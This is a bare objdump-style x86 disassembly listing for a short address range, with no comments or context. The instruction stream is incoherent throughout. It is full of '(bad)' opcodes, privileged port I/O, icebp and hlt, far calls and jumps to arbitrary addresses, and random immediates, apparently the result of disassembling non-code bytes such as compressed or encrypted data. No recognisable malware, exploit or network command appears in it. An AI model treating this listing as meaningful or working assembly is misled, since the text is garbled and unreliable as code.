  41f79f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f7a0:	jbe    0x41f745
  41f7a2:	data16 xchg BYTE PTR [edi+0x4],cl
  41f7a6:	dec    ecx
  41f7a7:	sub    BYTE PTR [ebp+0x1f9f22e5],0x77
  41f7ae:	pop    ebp
  41f7af:	and    DWORD PTR [ebx+0x73],ecx
  41f7b2:	mov    ch,0x83
  41f7b4:	or     eax,0xf83f3168
  41f7b9:	sub    cl,BYTE PTR [edx+0x7e84cc3e]
  41f7bf:	out    0x5f,eax
  41f7c1:	and    al,0xe2
  41f7c3:	inc    edi
  41f7c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f7c5:	aam    0x5a
  41f7c7:	cs sti 
  41f7c9:	fidivr DWORD PTR ds:[eax]
  41f7cc:	push   ss
  41f7cd:	inc    ecx
  41f7ce:	aas    
  41f7cf:	pushf  
  41f7d0:	icebp  
  41f7d1:	mov    esi,DWORD PTR [ebx+edx*2-0x675ab1ca]
  41f7d8:	mov    esp,0x9e8d1942
  41f7dd:	rcr    DWORD PTR ds:0x8da80990,1
  41f7e3:	fadd   DWORD PTR [eax-0x39a6ae6b]
  41f7e9:	push   0x55
  41f7eb:	popf   
  41f7ec:	(bad)  
  41f7ed:	and    ecx,esp
  41f7ef:	leave  
  41f7f0:	sbb    BYTE PTR [edi+0x79],0xeb
  41f7f4:	mov    ebp,0x9478516c
  41f7f9:	or     eax,0xb853350d
  41f7fe:	adc    BYTE PTR [ebx+0x1c],0x1
  41f802:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f803:	call   0x596fc61e
  41f808:	mov    dl,0xd2
  41f80a:	push   ebx
  41f80b:	call   0x1ae9aedd
  41f810:	and    eax,0x8e228ac5
  41f815:	mov    cs,WORD PTR [eax+esi*1-0x92a8920]
  41f81c:	mov    al,0x1c
  41f81e:	or     eax,DWORD PTR [ebx-0x59]
  41f821:	cs int 0x84
  41f824:	dec    edx
  41f825:	ja     0x41f7d3
  41f827:	leave  
  41f828:	outs   dx,BYTE PTR ds:[esi]
  41f829:	mov    esi,0x69edef4b
  41f82e:	mov    ch,0xd7
  41f830:	outs   dx,BYTE PTR ds:[esi]
  41f831:	mov    ebp,0x9f7bb201
  41f836:	adc    eax,esp
  41f838:	dec    ecx
  41f839:	mov    ah,0xa
  41f83b:	or     edi,ecx
  41f83d:	jmp    0x41f829
  41f83f:	cmp    DWORD PTR [esi*1-0x23b683cf],0xd96fedf8
  41f84a:	dec    esi
  41f84b:	rcr    BYTE PTR [eax-0x5d6f62bf],0x13
  41f852:	lods   eax,DWORD PTR ds:[esi]
  41f853:	mov    al,ds:0xcbe644
  41f858:	int3   
  41f859:	or     al,0x67
  41f85b:	jle    0x41f89c
  41f85d:	push   ebx
  41f85e:	popa   
  41f85f:	jmp    0x41f804
  41f861:	cmp    eax,0xe1a02bc
  41f866:	push   0xffffffc6
  41f868:	popf   
  41f869:	mov    al,ds:0xe91a2f5f
  41f86e:	and    ebp,DWORD PTR [edi+0x30ecb3f4]
  41f874:	mov    eax,ds:0x6df2b98b
  41f879:	mov    ebx,0x33c4a1f1
  41f87e:	loop   0x41f81b
  41f880:	or     al,0x41
  41f882:	int    0xf7
  41f884:	sahf   
  41f885:	fidiv  DWORD PTR [ecx]
  41f887:	bound  esi,QWORD PTR [ecx]
  41f889:	fsubr  QWORD PTR [esi]
  41f88b:	cli    
  41f88c:	pop    es
  41f88d:	mov    bl,0x2b
  41f88f:	sub    BYTE PTR [esi],dl
  41f891:	(bad)  
  41f892:	dec    edi
  41f893:	inc    esp
  41f894:	(bad)  
  41f895:	xor    al,0x37
  41f897:	push   ebx
  41f898:	lahf   
  41f899:	mov    ch,bl
  41f89b:	js     0x41f87a
  41f89d:	dec    edi
  41f89e:	sahf   
  41f89f:	add    esi,ebp
  41f8a1:	out    0xd4,eax
  41f8a3:	xor    cl,BYTE PTR [ecx-0x48]
  41f8a6:	inc    edi
  41f8a7:	sub    DWORD PTR [ecx+0xb],ebx
  41f8aa:	xlat   BYTE PTR ds:[ebx]
  41f8ab:	mov    cl,0x75
  41f8ad:	rol    esp,cl
  41f8af:	imul   ebp,DWORD PTR [edi-0x8a08366],0x992fe0d5
  41f8b9:	adc    eax,0x84887fcd
  41f8be:	outs   dx,DWORD PTR ds:[esi]
  41f8bf:	hlt    
  41f8c0:	fidivr DWORD PTR [ecx+edx*1+0x3219a84a]
  41f8c7:	dec    esi
  41f8c8:	loopne 0x41f8a6
  41f8ca:	int    0x17
  41f8cc:	shl    bl,0xf7
  41f8cf:	out    0x16,eax
  41f8d1:	or     al,0xa1
  41f8d3:	int3   
  41f8d4:	cwde   
  41f8d5:	xor    DWORD PTR [edx],edx
  41f8d7:	xor    DWORD PTR [ebp+esi*8-0x63d0f2fd],eax
  41f8de:	fld    TBYTE PTR [ebp+0x45]
  41f8e1:	sub    BYTE PTR [eax-0x5ed19434],ch
  41f8e7:	jns    0x41f895
  41f8e9:	dec    ebp
  41f8ea:	or     BYTE PTR [ebx+0x7],0x83
  41f8ee:	ins    BYTE PTR es:[edi],dx
  41f8ef:	cdq    
  41f8f0:	loopne 0x41f8aa
  41f8f2:	pusha  
  41f8f3:	into   
  41f8f4:	mov    bh,0x2a
  41f8f6:	call   0x73d2:0xfaf8a37
  41f8fd:	retf   0x4b6c
  41f900:	in     al,dx
  41f901:	add    dh,bh
  41f903:	(bad)  
  41f904:	cmc    
  41f905:	dec    edi
  41f906:	(bad)
  41f909:	cwde   
  41f90a:	sbb    ebx,0x74
  41f90d:	jne    0x41f97e
  41f90f:	packsswb mm4,QWORD PTR [ebp+edx*8+0x9b1a5f0]
  41f917:	sti    
  41f918:	dec    edi
  41f919:	fs cld 
  41f91b:	or     edi,esp
  41f91d:	scas   eax,DWORD PTR es:[edi]
  41f91e:	sbb    eax,0x522deb72
  41f923:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f924:	xor    BYTE PTR [edx],ch
  41f926:	cmp    eax,0xb527dc7a
  41f92b:	cmp    al,0x6
  41f92d:	int    0x74
  41f92f:	mov    ebx,0x222c6240
  41f934:	or     DWORD PTR [ebx+0x6f],edi
  41f937:	mov    DWORD PTR [esp+eax*1],edx
  41f93a:	inc    ebx
  41f93b:	mov    esi,0xa4a1088c
  41f940:	std    
  41f941:	inc    esi
  41f942:	jne    0x41f904
  41f944:	cdq    
  41f945:	sbb    edx,DWORD PTR [esi-0x3]
  41f948:	and    ax,0x1bd5
  41f94c:	dec    ebp
  41f94d:	lods   eax,DWORD PTR ds:[esi]
  41f94e:	inc    esi
  41f94f:	aas    
  41f950:	or     eax,0x1f115324
  41f955:	test   eax,0x6fff73ae
  41f95a:	jecxz  0x41f961
  41f95c:	sub    DWORD PTR [ecx],0x18
  41f95f:	rcr    BYTE PTR [esp+edx*8],1
  41f962:	daa    
  41f963:	inc    edx
  41f964:	sub    eax,0xcb31ee8e
  41f969:	shl    DWORD PTR [esi-0x62186a61],0x61
  41f970:	push   0x28fdb28b
  41f975:	dec    esp
  41f976:	pop    ebx
  41f977:	cmp    eax,0x11ca7ad3
  41f97c:	fisttp QWORD PTR [eax+ebp*1]
  41f97f:	or     al,0x65
  41f981:	xchg   BYTE PTR [esp+edi*1],al
  41f984:	clc    
  41f985:	es mov edx,0xbc600077
  41f98b:	xor    BYTE PTR [edi+0x2ddff6e7],bh
  41f991:	leave  
  41f992:	in     eax,0xc3
  41f994:	mov    WORD PTR [ebx+0x40ff72f3],ds
  41f99a:	adc    DWORD PTR [esp+eax*4+0x1b],eax
  41f99e:	pop    ds
  41f99f:	lahf   
  41f9a0:	adc    BYTE PTR [edi+0x4],dh
  41f9a3:	dec    ecx
  41f9a4:	or     bl,ah
  41f9a6:	sbb    eax,0x1ecce61c
  41f9ab:	mov    eax,ds:0xd76bf320
  41f9b0:	inc    ebp
  41f9b1:	not    BYTE PTR [ebx+0xb]
  41f9b4:	inc    esi
  41f9b5:	jle    0x41fa15
  41f9b7:	retf   
  41f9b8:	xchg   edx,eax
  41f9b9:	mov    edi,0x69b4f68a
  41f9be:	push   ds
  41f9bf:	int3   
  41f9c0:	add    al,0xd3
  41f9c2:	and    DWORD PTR [ebx-0x15d0e722],edi
  41f9c8:	or     bh,BYTE PTR ds:0x11d8e7da
  41f9ce:	enter  0xfb74,0x78
  41f9d2:	push   0x2885f498
  41f9d7:	stos   BYTE PTR es:[edi],al
  41f9d8:	fcomp  DWORD PTR [eax+0x10a7e4c9]
  41f9de:	sub    edx,DWORD PTR [ebx-0x1fb78f5c]
  41f9e4:	arpl   WORD PTR [eax+ebp*4],di
  41f9e7:	(bad)  
  41f9e9:	sub    al,0x85
  41f9eb:	mov    ?,WORD PTR [edx-0x5c]
  41f9ee:	nop    ebp
  41f9f1:	cmp    dl,al
  41f9f3:	sub    DWORD PTR [eax-0x67],0x30
  41f9f7:	push   edx
  41f9f8:	loope  0x41f9a9
  41f9fa:	cdq    
  41f9fb:	pop    esi
  41f9fc:	cmp    DWORD PTR [esi+eiz*4-0x427c7503],esp
  41fa03:	mov    ch,0x50
  41fa05:	xor    DWORD PTR [ebx+0x5d3d15f0],edx
  41fa0b:	(bad)  
  41fa0c:	xlat   BYTE PTR ds:[ebx]
  41fa0d:	sbb    ch,dl
  41fa0f:	and    eax,0x13f9df6e
  41fa14:	adc    al,0x50
  41fa16:	add    al,0x5a
  41fa18:	jne    0x41f9c8
  41fa1a:	jns    0x41f9b8
  41fa1c:	xchg   DWORD PTR ds:0x2318322b,edi
  41fa22:	pop    eax
  41fa23:	out    0xfb,al
  41fa25:	adc    bl,BYTE PTR [ecx-0x1f]
  41fa28:	inc    ebp
  41fa29:	mov    edi,0x278057bf
  41fa2e:	mul    BYTE PTR [eax]
  41fa30:	ja     0x41fa85
  41fa32:	mov    esi,0x403307e4
  41fa37:	sbb    DWORD PTR [eax+0x53f1769b],edi
  41fa3d:	iret   
  41fa3e:	dec    edx
  41fa3f:	or     bl,bl
  41fa41:	ds sbb eax,0x7c3fc1eb
  41fa47:	push   ebp
  41fa48:	(bad)
  41fa4b:	cmc    
  41fa4c:	fidiv  WORD PTR [edx]
  41fa4e:	sahf   
  41fa4f:	shl    DWORD PTR [ebp+0x43],0x17
  41fa53:	aas    
  41fa54:	jmp    0x41fa54
  41fa56:	sub    DWORD PTR [eax+0x26ccc12f],0xe5318f2c
  41fa60:	push   ebx
  41fa61:	in     eax,dx
  41fa62:	push   ebp
  41fa63:	(bad)  
  41fa64:	adc    esi,DWORD PTR [edx-0x2b]
  41fa67:	std    
  41fa68:	jnp    0x41fa9b
  41fa6a:	sub    eax,eax
  41fa6c:	dec    edx
  41fa6d:	pop    ecx
  41fa6e:	out    0xe8,eax
  41fa70:	adc    BYTE PTR [esi+0x79],cl
  41fa73:	ja     0x41faa4
  41fa75:	push   0x3b
  41fa77:	retf   
  41fa78:	xchg   esp,eax
  41fa79:	outs   dx,BYTE PTR ds:[esi]
  41fa7a:	xchg   BYTE PTR [ecx+0x33],bl
  41fa7d:	repnz pop es
  41fa7f:	sub    al,0xc3
  41fa81:	sbb    BYTE PTR [edx],al
  41fa83:	rol    BYTE PTR ds:0x1cd1e6ac,0x2d
  41fa8a:	aas    
  41fa8b:	(bad)  [edi]
  41fa8d:	mov    cl,0xa9
  41fa8f:	cwde   
  41fa90:	sbb    eax,0x3534fefb
  41fa95:	inc    esi
  41fa96:	outs   dx,DWORD PTR ds:[esi]
  41fa97:	sbb    eax,0x94f1bf86
  41fa9c:	je     0x41fadd
  41fa9e:	inc    ebp
  41fa9f:	jge    0x41fb1a
  41faa1:	out    0x6e,eax
  41faa3:	je     0x41fa47
  41faa5:	rol    BYTE PTR [edx-0x758e6aff],cl
  41faab:	xchg   edx,eax
  41faac:	nop
  41faad:	pop    esp
  41faae:	int    0x24
  41fab0:	adc    ebx,ecx
  41fab2:	pop    ds
  41fab3:	in     eax,dx
  41fab4:	jo     0x41fab7
  41fab6:	xchg   DWORD PTR [esp+esi*1],ebp
  41fab9:	shl    DWORD PTR [ecx+edx*1],cl
  41fabc:	div    BYTE PTR [edx+eiz*8-0x22964732]
  41fac3:	sub    ebp,DWORD PTR [esi]
  41fac5:	cmp    ah,BYTE PTR [ecx*8+0x5636a929]
  41facc:	enter  0xc175,0xea
  41fad0:	or     al,0xc6
  41fad2:	(bad)  
  41fad3:	loopne 0x41faea
  41fad5:	jl     0x41faf5
  41fad7:	imul   BYTE PTR [eax-0x5]
  41fada:	(bad)  
  41fadb:	call   0xc059d5f9
  41fae0:	out    0x5a,eax
  41fae2:	and    DWORD PTR [edi+0xf],esp
  41fae5:	in     eax,dx
  41fae6:	out    0x19,al
  41fae8:	cmp    al,0x7b
  41faea:	add    esp,DWORD PTR [ecx]
  41faec:	jbe    0x41faef
  41faee:	es sahf 
  41faf0:	scas   eax,DWORD PTR es:[edi]
  41faf1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41faf2:	jno    0x41fb35
  41faf4:	push   0xffffff85
  41faf6:	mov    edx,0x36b341c5
  41fafb:	or     eax,0xd461b591
  41fb00:	xchg   edi,eax
  41fb01:	imul   edi,ebp,0xffffff9d
  41fb04:	adc    ch,dl
  41fb06:	push   ecx
  41fb07:	repnz (bad) 
  41fb09:	int    0xf
  41fb0b:	fbld   TBYTE PTR [ebp+0x3e5f8b94]
  41fb11:	iret   
  41fb12:	adc    BYTE PTR [eax+0xe],bh
  41fb15:	les    esi,FWORD PTR [ebp-0x1f]
  41fb18:	shl    DWORD PTR es:[esi],0x6e
  41fb1c:	xor    al,0x64
  41fb1e:	mov    ebx,0x769ebcf
  41fb23:	cmp    al,bh
  41fb25:	icebp  
  41fb26:	dec    ebp
  41fb27:	inc    edx
  41fb28:	lods   eax,DWORD PTR ds:[esi]
  41fb29:	stos   BYTE PTR es:[edi],al
  41fb2a:	retf   
  41fb2b:	aam    0xec
  41fb2d:	cmp    edi,DWORD PTR [ebp-0x29]
  41fb30:	int3   
  41fb31:	lahf   
  41fb32:	xor    al,0xa9
  41fb34:	lea    edx,[esi+eax*4+0x51]
  41fb38:	mov    ah,0x1c
  41fb3a:	pop    es
  41fb3b:	std    
  41fb3c:	inc    edi
  41fb3d:	mov    esi,0x3546a08
  41fb42:	jg     0x41fba6
  41fb44:	ins    DWORD PTR es:[edi],dx
  41fb45:	ror    BYTE PTR [ecx-0x4ac807d],cl
  41fb4b:	add    BYTE PTR [eax],dh
  41fb4d:	pop    ss
  41fb4e:	popf   
  41fb4f:	ror    BYTE PTR [esi+0x6eb4cdd4],cl
  41fb55:	cs inc bx
  41fb58:	inc    edx
  41fb59:	add    ah,dh
  41fb5b:	sti    
  41fb5c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fb5d:	int3   
  41fb5e:	dec    ecx
  41fb5f:	push   es
  41fb60:	push   ds
  41fb61:	sbb    BYTE PTR [ebx-0x2d],dl
  41fb64:	ins    BYTE PTR es:[edi],dx
  41fb65:	inc    edx
  41fb66:	cdq    
  41fb67:	into   
  41fb68:	aaa    
  41fb69:	addr16 mov ds:0x8784,eax
  41fb6d:	xchg   edx,eax
  41fb6e:	(bad)  
  41fb6f:	outs   dx,DWORD PTR ds:[esi]
  41fb70:	aaa    
  41fb71:	cmp    bh,BYTE PTR [edi+eax*2+0x4f]
  41fb75:	(bad)  
  41fb77:	ss dec ebx
  41fb79:	cs jge 0x41fb90
  41fb7c:	out    dx,eax
  41fb7d:	mov    ds:0x35777254,eax
  41fb82:	jbe    0x41fb6e
  41fb84:	(bad)  
  41fb85:	sbb    al,0x2b
  41fb87:	pop    edx
  41fb88:	adc    cl,BYTE PTR [ebp+0x30]
  41fb8b:	(bad)
  41fb8f:	jnp    0x41fb1b
  41fb91:	mov    al,ds:0xcc635507
  41fb96:	bound  eax,QWORD PTR [esi+0x9]
  41fb99:	daa    
  41fb9a:	push   cs
  41fb9b:	ins    DWORD PTR es:[edi],dx
  41fb9c:	jb     0x41fbd5
  41fb9e:	test   al,0xb3
  41fba0:	sub    eax,DWORD PTR [edi+0x7662e279]
  41fba6:	cmc    
  41fba7:	bswap  eax
  41fba9:	aad    0x53
  41fbab:	ss add eax,0xd08997ac
  41fbb1:	out    dx,eax
  41fbb2:	arpl   WORD PTR [esi],bx
  41fbb4:	sar    DWORD PTR [ecx],1
  41fbb6:	inc    ebp
  41fbb7:	lock lea ecx,[ebx]
  41fbba:	std    
  41fbbb:	inc    esi
  41fbbc:	adc    bh,BYTE PTR [edi+0x70168876]
  41fbc2:	ret    0x1466
  41fbc5:	mov    eax,0xd6d1778a
  41fbca:	inc    ebp
  41fbcb:	fcomp  DWORD PTR [eax+0x62]
  41fbce:	daa    
  41fbcf:	shl    DWORD PTR [edx+0x64],0xc6
  41fbd3:	and    BYTE PTR [eax-0x7e44755],dl
  41fbd9:	jb     0x41fb7e
  41fbdb:	mov    ch,0x9e
  41fbdd:	nop
  41fbde:	in     al,0xae
  41fbe0:	je     0x41fc3b
  41fbe2:	(bad)  
  41fbe3:	push   edi
  41fbe4:	adc    esi,DWORD PTR [ebx+0x6e]
  41fbe7:	fwait
  41fbe8:	xor    eax,0xa129a2bb
  41fbed:	xchg   BYTE PTR [ecx],cl
  41fbef:	je     0x41fc5e
  41fbf1:	fild   DWORD PTR [eax]
  41fbf3:	mul    DWORD PTR [eax-0x54]
  41fbf6:	imul   esp,ebx,0xffffffa5
  41fbf9:	mov    ds:0x12860426,al
  41fbfe:	jno    0x41fc54
  41fc00:	les    ebp,FWORD PTR [ebx+0x2e]
  41fc03:	enter  0x4f33,0xa7
  41fc07:	scas   al,BYTE PTR es:[edi]
  41fc08:	sbb    eax,0xc31c76b5
  41fc0d:	retf   
  41fc0e:	std    
  41fc0f:	repnz mov edx,0x5600139a
  41fc15:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fc16:	pusha  
  41fc17:	inc    ecx
  41fc18:	test   DWORD PTR [eax],ebx
  41fc1a:	mov    bl,dh
  41fc1c:	jns    0x41fc00
  41fc1e:	xchg   edi,eax
  41fc1f:	ds movq mm4,mm3
  41fc23:	out    dx,eax
  41fc24:	(bad)  
  41fc25:	shl    BYTE PTR [ebx],cl
  41fc27:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fc28:	icebp  
  41fc29:	push   ebp
  41fc2a:	xchg   ebx,eax
  41fc2b:	ja     0x41fc56
  41fc2d:	cwde   
  41fc2e:	inc    ecx
  41fc2f:	xchg   edi,eax
  41fc30:	imul   edx,eax,0x378fc7f2
  41fc36:	leave  
  41fc37:	ja     0x41fc07
  41fc39:	repz ret 0x74b5
  41fc3d:	inc    edx
  41fc3e:	icebp  
  41fc3f:	xchg   esp,eax
  41fc40:	add    ebx,ebp
  41fc42:	xor    dh,BYTE PTR [esi+ebp*8+0x5bdf39c6]
  41fc49:	in     eax,0xb3
  41fc4b:	fsubr  st(3),st
  41fc4d:	inc    ecx
  41fc4e:	dec    edx
  41fc4f:	mov    ch,0x50
  41fc51:	or     DWORD PTR [eax-0x14],esp
  41fc54:	lds    edi,FWORD PTR [edx+0x6d]
  41fc57:	nop
  41fc58:	jmp    0x6ba1:0x4edbbfbf
  41fc5f:	ret    0x8568
  41fc62:	adc    ebp,DWORD PTR [edx-0x6c]
  41fc65:	sub    bl,BYTE PTR [edx]
  41fc67:	(bad)  
  41fc68:	fwait
  41fc69:	push   edx
  41fc6a:	test   BYTE PTR [ecx-0x32426e9],ah
  41fc70:	inc    edx
  41fc71:	aas    
  41fc72:	jmp    0x58d3:0x74611305
  41fc79:	pop    ss
  41fc7a:	es xor al,0xc8
  41fc7d:	dec    edx
  41fc7e:	pop    eax
  41fc7f:	shr    edi,0x88
  41fc82:	cdq    
  41fc83:	mov    DWORD PTR [edi+0x361f464d],ebp
  41fc89:	sub    DWORD PTR [edx],ebp
  41fc8b:	jne    0x41fc55
  41fc8d:	fwait
  41fc8e:	dec    esi
  41fc8f:	mov    edi,0x2ae5dbb1
  41fc94:	loope  0x41fd01
  41fc96:	push   ebp
  41fc97:	dec    esi
  41fc98:	dec    ebx
  41fc99:	pop    ebx
  41fc9a:	push   cs
  41fc9b:	outs   dx,DWORD PTR ds:[esi]
  41fc9c:	jbe    0x41fc98
  41fc9e:	in     al,dx
  41fc9f:	xor    BYTE PTR [esi-0x3e],0xca
  41fca3:	adc    ah,al
  41fca5:	pop    edx
  41fca6:	push   ds
  41fca7:	ja     0x41fcfd
  41fca9:	sbb    eax,DWORD PTR [esi-0x49]
  41fcac:	fldcw  WORD PTR [esi+ebp*8+0x51]
  41fcb0:	xchg   edx,eax
  41fcb1:	rcr    DWORD PTR [esi],cl
  41fcb3:	bound  esi,QWORD PTR [ecx+0x5a]
  41fcb6:	xor    DWORD PTR [edi+0xb],esi
  41fcb9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fcba:	cs or  DWORD PTR gs:[edx],0xd6090cc6
  41fcc2:	mov    dh,0x9
  41fcc4:	call   0x4e26:0xa5c152b0
  41fccb:	adc    DWORD PTR [esi],edi
  41fccd:	repnz in al,0x6f
  41fcd0:	test   eax,0xbe50b770
  41fcd5:	xchg   edx,eax
  41fcd6:	hlt    
  41fcd7:	adc    edi,DWORD PTR [ecx]
  41fcd9:	lahf   
  41fcda:	push   esp
  41fcdb:	and    eax,0x5c5101c8
  41fce0:	or     edi,ebp
  41fce2:	int3   
  41fce3:	mov    edi,ebp
  41fce5:	inc    esp
  41fce6:	jns    0x41fcb8
  41fce8:	sahf   
  41fce9:	leave  
  41fcea:	aam    0xb6
  41fcec:	push   ebp
  41fced:	mov    ds:0xaf8ab948,eax
  41fcf2:	xchg   bl,ch
  41fcf4:	or     al,0x2a
  41fcf6:	in     al,dx
  41fcf7:	dec    ecx
  41fcf8:	cs and eax,0xf9d2b11f
  41fcfe:	and    al,0x15
  41fd00:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fd01:	pop    edx
  41fd02:	imul   ecx,eax,0x20dcd47f
  41fd08:	pop    es
  41fd09:	mov    ebp,DWORD PTR [edi+0x62]
  41fd0c:	stc    
  41fd0d:	inc    edx
  41fd0e:	imul   eax,DWORD PTR [ebp-0x23aae3aa],0x41
  41fd15:	test   DWORD PTR [edx+0xebc2c66],0x2dc32f98
  41fd1f:	cmp    al,al
  41fd21:	and    eax,0xc4abbfb2
  41fd26:	lods   eax,DWORD PTR ds:[esi]
  41fd27:	mov    al,ds:0xe7525404
  41fd2c:	mov    ds:0xc1567248,eax
  41fd31:	cmp    ah,bh
  41fd33:	stc    
  41fd34:	test   DWORD PTR [edi-0x8a1ff72],esp
  41fd3a:	sbb    edx,DWORD PTR [eax-0x30]
  41fd3d:	fist   DWORD PTR ds:0xdc4714f9
  41fd43:	jmp    0xaa891c33
  41fd48:	add    ebp,edi
  41fd4a:	daa    
  41fd4b:	xchg   edx,eax
  41fd4c:	cdq    
  41fd4d:	and    eax,0x719c9fcf
  41fd52:	or     al,0x87
  41fd54:	mov    ch,0x2
  41fd56:	or     eax,0xd3b703e6
  41fd5b:	pminsw mm5,QWORD PTR [edi-0x48f76446]
  41fd62:	icebp  
  41fd63:	imul   edi,ecx,0x4491442a
  41fd69:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fd6a:	hlt    
  41fd6b:	out    0x59,eax
  41fd6d:	adc    dl,BYTE PTR [esi+0xeab29b1]
  41fd73:	add    al,0xab
  41fd75:	sbb    DWORD PTR [eax+0x1ca2aae9],edx
  41fd7b:	fld    TBYTE PTR [esi+0x56]
  41fd7e:	call   0xe4c361a9
  41fd83:	pop    ss
  41fd84:	inc    esp
  41fd85:	arpl   dx,si
  41fd87:	adc    DWORD PTR [edx],0xffffffdf
  41fd8a:	jge    0x41fde7
  41fd8c:	inc    ebp
  41fd8d:	jle    0x41fd3d
  41fd8f:	outs   dx,BYTE PTR ds:[esi]
  41fd90:	in     eax,dx
  41fd91:	cld    
  41fd92:	jns    0x41fd15
  41fd94:	cmp    al,0x5c
  41fd96:	cmp    BYTE PTR [eax],dl
  41fd98:	fs push ecx
  41fd9a:	or     al,0xe5
  41fd9c:	(bad)  
  41fd9d:	fwait
  41fd9e:	mov    WORD PTR [edi],es
  41fda0:	xor    BYTE PTR [ebx-0x7a5b62e4],ah
  41fda6:	daa    
  41fda7:	push   ds
  41fda8:	jmp    0x4f07836a
  41fdad:	xchg   esi,eax
  41fdae:	pop    ds
  41fdaf:	mov    BYTE PTR [edi+eax*4+0x78653850],al
  41fdb6:	out    0x96,al
  41fdb8:	jae    0x41fd40
  41fdba:	mov    ebp,0x62dbad67
  41fdbf:	lahf   
  41fdc0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fdc1:	mov    ebp,DWORD PTR [edx]
  41fdc3:	mov    ebx,0x9f64ef19
  41fdc8:	scas   eax,DWORD PTR es:[edi]
  41fdc9:	fidivr WORD PTR [edx+0x6c7b3a9a]
  41fdcf:	and    DWORD PTR [ebp+0x6f52b559],ebp
  41fdd5:	mov    ds:0x5920051,al
  41fdda:	(bad)  
  41fddb:	push   0x16e3a8e
  41fde0:	xchg   edi,eax
  41fde1:	inc    ebx
  41fde2:	arpl   sp,cx
  41fde4:	adc    BYTE PTR gs:[edi+0x3e],ch
  41fde8:	pop    di
  41fdea:	aaa    
  41fdeb:	dec    eax
  41fdec:	mov    WORD PTR [eax+0x20],ss
  41fdef:	mov    WORD PTR cs:[edx-0xd],?
  41fdf3:	aas    
  41fdf4:	and    esp,edx
  41fdf6:	loope  0x41fe2b
  41fdf8:	sub    eax,0xe88fbaa9
  41fdfd:	jp     0x41fe74
  41fdff:	inc    ebp
  41fe00:	data16 fistp QWORD PTR [ecx]
  41fe03:	test   ebp,0x1a8f05dc
  41fe09:	push   ds
  41fe0a:	mov    DWORD PTR [eax-0x6773d550],edi
  41fe10:	jno    0x41fdfe
  41fe12:	mov    BYTE PTR [ebx],0x9c
  41fe15:	or     al,0x7c
  41fe17:	shl    DWORD PTR [ebx],0x9
  41fe1a:	adc    al,0xe0
  41fe1c:	dec    edi
  41fe1d:	ss lock daa 
  41fe20:	jg     0x41fe0e
  41fe22:	in     al,dx
  41fe23:	jne    0x41fea1
  41fe25:	retf   
  41fe26:	data16 cs daa 
  41fe29:	xor    BYTE PTR [edi-0x51],0x85
  41fe2d:	(bad)  
  41fe2e:	fcom   DWORD PTR [esi-0x39ca96f5]
  41fe34:	jecxz  0x41fdd1
  41fe36:	jns    0x41fe43
  41fe38:	jbe    0x41fe05
  41fe3a:	retf   0x8f96
  41fe3d:	clc    
  41fe3e:	xchg   edx,eax
  41fe3f:	or     eax,0xd2e584ab
  41fe44:	sti    
  41fe45:	mov    eax,ds:0xc4953cbf
  41fe4a:	mov    edx,0x246c8adb
  41fe4f:	inc    ebp
  41fe50:	repz lock popa 
  41fe53:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fe54:	and    bh,ch
  41fe56:	mov    ebp,esp
  41fe58:	dec    ecx
  41fe59:	arpl   WORD PTR [ebp+0x5f],bx
  41fe5c:	xor    DWORD PTR [ebx+0x65],edi
  41fe5f:	(bad)  
  41fe60:	jmp    0x41feda
  41fe62:	inc    edi
  41fe63:	inc    ebx
  41fe64:	push   esi
  41fe65:	daa    
  41fe66:	ins    BYTE PTR es:[edi],dx
  41fe67:	test   eax,0xbfa3181e
  41fe6c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fe6d:	push   ebx
  41fe6e:	aam    0xe6
  41fe70:	int3   
  41fe71:	bound  ebx,QWORD PTR [esi-0x3466978d]
  41fe77:	test   BYTE PTR [ecx-0x74b714cc],0x55
  41fe7e:	xor    esp,DWORD PTR [esi-0x58]
  41fe81:	jg     0x41fe35
  41fe83:	pop    edi
  41fe84:	inc    ebx
  41fe85:	pop    edi
  41fe86:	mov    esp,0x949536f
  41fe8b:	add    edx,edx
  41fe8d:	push   ebp
  41fe8e:	hlt    
  41fe8f:	ret    0x394f
  41fe92:	(bad)
  41fe95:	bound  ebp,QWORD PTR [ecx-0x5cbe5cac]
  41fe9b:	sahf   
  41fe9c:	xlat   BYTE PTR ds:[ebx]
  41fe9d:	nop
  41fe9e:	xchg   esi,eax
  41fe9f:	retf   
  41fea0:	jnp    0x41feeb
  41fea2:	and    dl,cl
  41fea4:	add    al,0x49
  41fea6:	pop    edx
  41fea7:	pop    ecx
  41fea8:	lds    edx,FWORD PTR [eax]
  41feaa:	jg     0x41ff25
  41feac:	inc    eax
  41fead:	dec    ebp
  41feae:	mov    ch,0xa1
  41feb0:	lods   eax,DWORD PTR ds:[esi]
  41feb1:	(bad)  
  41feb2:	int3   
  41feb3:	sub    cl,BYTE PTR [edi]
  41feb5:	jno    0x41fe97
  41feb7:	mov    dl,0xe6
  41feb9:	lods   al,BYTE PTR ds:[esi]
  41feba:	mov    dl,0x7a
  41febc:	sti    
  41febd:	dec    ebp
  41febe:	xchg   esp,eax
  41febf:	in     al,0x4
  41fec1:	ss sub al,0xcf
  41fec4:	scas   eax,DWORD PTR es:[edi]
  41fec5:	rol    DWORD PTR [edi-0x13298107],0x6
  41fecc:	pop    ecx
  41fecd:	pop    edx
  41fece:	arpl   bx,bp
  41fed0:	xchg   edi,eax
  41fed1:	jp     0x41ff21
  41fed3:	jo     0x41ff20
  41fed5:	clc    
  41fed6:	fidivr WORD PTR [ebp-0x3e669388]
  41fedc:	or     esi,DWORD PTR [eax+0x49]
  41fedf:	sub    esi,DWORD PTR [edx-0x4b9ed300]
  41fee5:	outs   dx,DWORD PTR ds:[esi]
  41fee6:	aas    
  41fee7:	mov    dl,0x8e
  41fee9:	ins    BYTE PTR es:[edi],dx
